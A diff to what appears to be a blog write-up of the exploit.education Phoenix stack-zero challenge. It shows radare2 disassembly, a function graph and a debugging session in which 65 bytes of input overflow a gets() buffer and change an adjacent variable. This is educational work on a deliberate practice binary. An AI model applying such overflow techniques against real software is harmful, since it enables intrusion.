@@ -55,17 +55,21 @@ What can be gathered from the above info are the following:
 
 Considering the above information, if the binary accepts input via environment variables, arguments or STDIN, it can be exploited.
 
-To open the binary, `r2` can be used.
+To disassemble the binary, `r2` can be used.
 
 {% highlight shell %}
 $ r2 /opt/phoenix/i486/stack-zero
-> aas
 {% endhighlight %}
 
-It is not recommended to use `aaa` or `-A` as an argument when opening a binary, because it could take a really long time if that binary is big. Using radare2, one needs to know what analysis is more beneficial at every stage of reverse engineering a binary. In this particular case, `aas`, which uses binary header information to find public functions, is good enough.
+{% highlight nasm %}
+[0x08048320]> aas
+Cannot analyze at 0x08048560
+{% endhighlight %}
+
+It is not recommended to use `aaa` or `-A` as an argument when opening a binary, because it could take a really long time if that binary is big. Using `radare2`, one needs to know what analysis is more beneficial at every stage of reverse engineering a binary. In this particular case, `aas`, which uses binary header information to find public functions, is good enough.
 
 {% highlight nasm %}
-> afl
+[0x08048320]> afl
 0x080482b4    1 17           sym._init
 0x08048470    7 277  -> 112  sym.frame_dummy
 0x08048520    5 49           sym.__do_global_ctors_aux
@@ -84,8 +88,8 @@ It is not recommended to use `aaa` or `-A` as an argument when opening a binary,
 There are a couple options available to view the disassembly at a particular address. One that can be used is `s` to seek to that address and then use `pdf` to disassemble the current function, or `VV` to use the Visual Graph.
 
 {% highlight nasm %}
-> s main
-> pdf
+[0x08048320]> s main
+[0x080484b5]> pdf
 / (fcn) main 106
 |   int main (int argc, char **argv, char **envp);
 |           ; var int32_t var_4ch @ ebp-0x4c
@@ -128,6 +132,76 @@ There are a couple options available to view the disassembly at a particular add
 \           0x0804851a      e8e1fdffff     call sym.imp.exit           ; sym..interp+0x1ec
 {% endhighlight %}
 
+Another cool command is `agf`, which outputs the basic blocks function graph.
+
+{% highlight nasm %}
+[0x080484b5]> agf
+[0x080484b5]>  # int main (int argc, char **argv, char **envp);
+                            .----------------------------------------------------------------------------------------.
+                            |  0x80484b5                                                                             |
+                            | (fcn) main 106                                                                         |
+                            |   int main (int argc, char **argv, char **envp);                                       |
+                            | ; var int32_t var_4ch @ ebp-0x4c                                                       |
+                            | ; var int32_t var_ch @ ebp-0xc                                                         |
+                            | ; arg int32_t arg_4h @ esp+0x4                                                         |
+                            | ; DATA XREF from entry0 @ 0x8048354                                                    |
+                            | lea ecx, [arg_4h]                                                                      |
+                            | and esp, 0xfffffff0                                                                    |
+                            | push dword [ecx - 4]                                                                   |
+                            | push ebp                                                                               |
+                            | mov ebp, esp                                                                           |
+                            | push ecx                                                                               |
+                            | sub esp, 0x54                                                                          |
+                            | sub esp, 0xc                                                                           |
+                            | ; sym..rodata                                                                          |
+                            | ; 0x8048560                                                                            |
+                            | ; "Welcome to phoenix/stack-zero, brought to you by https://exploit.education"         |
+                            | push str.Welcome_to_phoenix_stack_zero__brought_to_you_by_https:__exploit.education    |
+                            | ; int puts(const char *s)                                                              |
+                            | call sym.imp.puts;[oa]                                                                 |
+                            | add esp, 0x10                                                                          |
+                            | mov dword [var_ch], 0                                                                  |
+                            | sub esp, 0xc                                                                           |
+                            | lea eax, [var_4ch]                                                                     |
+                            | push eax                                                                               |
+                            | ; sym..interp+0x1cc                                                                    |
+                            | call sym.imp.gets;[ob]                                                                 |
+                            | add esp, 0x10                                                                          |
+                            | mov eax, dword [var_ch]                                                                |
+                            | test eax, eax                                                                          |
+                            | je 0x8048505                                                                           |
+                            `----------------------------------------------------------------------------------------'
+                                    f t
+                                    | |
+                                    | '-----------------------------------.
+    .-------------------------------'                                     |
+    |                                                                     |
+.-----------------------------------------------------------------.   .-------------------------------------------------------------------------------------.
+|  0x80484f3                                                      |   |  0x8048505                                                                          |
+| sub esp, 0xc                                                    |   | sub esp, 0xc                                                                        |
+| ; 0x80485ac                                                     |   | ; 0x80485e4                                                                         |
+| ; "Well done, the 'changeme' variable has been changed!"        |   | ; "Uh oh, 'changeme' has not yet been changed. Would you like to try again?"        |
+| push str.Well_done__the__changeme__variable_has_been_changed    |   | push str.Uh_oh___changeme__has_not_yet_been_changed._Would_you_like_to_try_again    |
+| ; int puts(const char *s)                                       |   | ; int puts(const char *s)                                                           |
+| call sym.imp.puts;[oa]                                          |   | call sym.imp.puts;[oa]                                                              |
+| add esp, 0x10                                                   |   | add esp, 0x10                                                                       |
+| jmp 0x8048515                                                   |   `-------------------------------------------------------------------------------------'
+`-----------------------------------------------------------------'       v
+    v                                                                     |
+    |                                                                     |
+    '--------------------------------------------------------.            |
+                                                             | .----------'
+                                                             | |
+                                                       .-----------------------------------.
+                                                       |  0x8048515                        |
+                                                       | ; CODE XREF from main @ 0x8048503 |
+                                                       | sub esp, 0xc                      |
+                                                       | push 0                            |
+                                                       | ; sym..interp+0x1ec               |
+                                                       | call sym.imp.exit;[oc]            |
+                                                       `-----------------------------------'
+{% endhighlight %}
+
 There are a few things that can be seen from the disassembled main function:
 1. There are two local variables:
     * `var_4ch`, which is the buffer where the input from STDIN is saved at and it has a size of `0x4c-0xc=0x40` (64 bytes in decimal).
@@ -137,7 +211,7 @@ There are a few things that can be seen from the disassembled main function:
 
 With that in mind, to exploit this the input must have a size of, at least, 65 bytes (64 is the size of the buffer and to overwrite the value of `var_ch` one more byte at minimum is needed).
 
-Before opening the binary in debugger mode using radare2, a rarun2 profile is needed so that the input can be read from the binary. In order to do that, a file needs to be created with the following contents:
+Before opening the binary in debugger mode using `radare2`, a `rarun2` profile is needed so that the input can be read from the binary. In order to do that, a file needs to be created with the following contents:
 
 {% highlight shell %}
 #!/usr/bin/env rarun2
@@ -163,64 +237,70 @@ Now, the binary can be debugged as follows:
 $ r2 -d /opt/phoenix/i486/stack-zero -e dbg.profile=myProfile.rr2
 {% endhighlight %}
 
+*Note that when debugging with radare2, the visual panels are really awesome! They can be accessed with `v!` or `V!`.*
+
 To showcase that the binary is indeed vulnerable, a breakpoint before the call to `gets` is necessary. That can be done by simply executing `db` followed by the address and then `dc` to continue until the breakpoint is hit.
 
-{% highlight plaintext %}
-> aas
-> db 0x080484e4
-> dc
+{% highlight nasm %}
+[0xf7f03d4b]> aas
+Cannot analyze at 0x08048560
+[0xf7f03d4b]> db 0x080484e4
+[0xf7f03d4b]> dc
+Welcome to phoenix/stack-zero, brought to you by https://exploit.education
+hit breakpoint at: 80484e4
 {% endhighlight %}
 
 Before calling `gets`, it is a good idea to check the value of `var_ch`. This can be accomplished by first checking the value of the `ebp` register, via `dr`, and then viewing the hexdump at address `ebp-0xc`, via `px/xw`.
 
 {% highlight nasm %}
-> dr
-eax = 0xff8c805c
-ebx = 0xf7f14000
-ecx = 0xff8c7f90
+[0x080484e4]> dr
+eax = 0xff9353cc
+ebx = 0xf7f39000
+ecx = 0xff935300
 edx = 0x00000000
-esi = 0xff8c8134
+esi = 0xff9354a4
 edi = 0x00000001
-esp = 0xff8c8040
-ebp = 0xff8c80a8
+esp = 0xff9353b0
+ebp = 0xff935418
 eip = 0x080484e4
 eflags = 0x00000296
 oeax = 0xffffffff
-> px/xw 0xff8c80a8-0xc
-0xff8c809c  0x00000000                                   ....
+[0x080484e4]> px/xw 0xff935418-0xc
+0xff93540c  0x00000000                                   ....
 {% endhighlight %}
 
 To execute the next instruction by stepping over, simply use `dso`.
 
 {% highlight nasm %}
-> dso
-> dr
-eax = 0xff8c805c
-ebx = 0xf7f14000
+[0x080484e4]> dso
+hit breakpoint at: 80484e9
+[0x080484e4]> dr
+eax = 0xff9353cc
+ebx = 0xf7f39000
 ecx = 0xfefeff09
 edx = 0x80808000
-esi = 0xff8c8134
+esi = 0xff9354a4
 edi = 0x00000001
-esp = 0xff8c8040
-ebp = 0xff8c80a8
+esp = 0xff9353b0
+ebp = 0xff935418
 eip = 0x080484e9
 eflags = 0x00000286
 oeax = 0xffffffff
-> px/24xw 0xff8c8040
-0xff8c8040  0xff8c805c 0x00000000 0x0000006f 0x00000010  \.......o.......
-0xff8c8050  0x080482b4 0x08048551 0x00000000 0x58585858  ....Q.......XXXX
-0xff8c8060  0x58585858 0x58585858 0x58585858 0x58585858  XXXXXXXXXXXXXXXX
-0xff8c8070  0x58585858 0x58585858 0x58585858 0x58585858  XXXXXXXXXXXXXXXX
-0xff8c8080  0x58585858 0x58585858 0x58585858 0x58585858  XXXXXXXXXXXXXXXX
-0xff8c8090  0x58585858 0x58585858 0x58585858 0x41414141  XXXXXXXXXXXXAAAA
-> px/xw 0xff8c80a8-0xc
-0xff8c809c  0x41414141                                   AAAA
+[0x080484e4]> px/24xw 0xff9353b0
+0xff9353b0  0xff9353cc 0x00000000 0x0000006f 0x00000010  .S......o.......
+0xff9353c0  0x080482b4 0x08048551 0x00000000 0x58585858  ....Q.......XXXX
+0xff9353d0  0x58585858 0x58585858 0x58585858 0x58585858  XXXXXXXXXXXXXXXX
+0xff9353e0  0x58585858 0x58585858 0x58585858 0x58585858  XXXXXXXXXXXXXXXX
+0xff9353f0  0x58585858 0x58585858 0x58585858 0x58585858  XXXXXXXXXXXXXXXX
+0xff935400  0x58585858 0x58585858 0x58585858 0x41414141  XXXXXXXXXXXXAAAA
+[0x080484e4]> px/xw 0xff935418-0xc
+0xff93540c  0x41414141                                   AAAA
 {% endhighlight %}
 
 As shown above, the value of `var_ch` is indeed overwritten.
 
 {% highlight plaintext %}
-> dc
+[0x080484e4]> dc
 Well done, the 'changeme' variable has been changed!
 {% endhighlight %}
 
